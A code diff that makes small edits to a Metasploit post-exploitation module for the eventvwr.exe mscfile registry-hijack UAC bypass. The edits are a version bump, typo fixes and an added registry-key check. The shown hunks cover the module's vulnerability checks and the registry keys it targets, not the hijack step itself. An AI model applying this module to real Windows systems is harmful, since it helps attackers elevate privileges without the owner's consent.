@@ -98,8 +98,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln dicover : enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.2',
-                        'DisclosureDate' => 'jan 3 2017',
+                        'Version'        => '$Revision: 1.3',
+                        'DisclosureDate' => 'jan 4 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
@@ -165,7 +165,6 @@ def ls_stage1
     Rex::sleep(1.5)
   end
 
-
     # search in target regedit if eventvwr calls mmc.exe
     print_warning("Reading proccess registry hive keys...")
     Rex::sleep(1.0)
@@ -176,7 +175,7 @@ def ls_stage1
        # registry hive key not found, aborting module execution.
        print_warning("Hive key: HKCR\\mscfile\\shell\\open\\command (mmc.exe call)")
        print_error("Post-module cant find the registry hive key needed...")
-       print_error("System does not apper to be vuln to the exploit code!")
+       print_error("System does not appear to be vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
@@ -237,7 +236,7 @@ def ls_stage2
        # registry hive key not found, aborting module execution.
        print_warning("Hive key: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
        print_error("Post-module cant find the registry hive key needed...")
-       print_error("System does not apper to be vuln to the exploit code!")
+       print_error("System does not appear to be vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
@@ -294,6 +293,11 @@ def ls_stage3
       hive_status = "#{check_vuln_call}"
     end
 
+      # check target registry hive/key settings
+      if not registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
+        vuln_key = "NOT FOUND"
+      end
+
     # check target registry hive/key settings
     check_vuln_key = registry_getvaldata(vuln_key,vuln_valu)
     if check_vuln_key.nil? || check_vuln_key == 0
@@ -302,9 +306,6 @@ def ls_stage3
       key_status = "#{check_vuln_key}"
     end
 
-  print_line("")
-  print_line("")
-  Rex::sleep(1.0)
   # display target registry settings to user... 
   print_line("VULNERABLE_SOFT : #{vuln_soft}")
   print_line("    VULN_HIVE   : #{vuln_hive}")
@@ -313,7 +314,7 @@ def ls_stage3
   print_line("    HIJACK_HIVE : #{vuln_key}")
   print_line("    KEY_DATA    : #{key_status}")
   print_line("")
-  print_line("")
+Rex::sleep(0.5)
 end
 
 
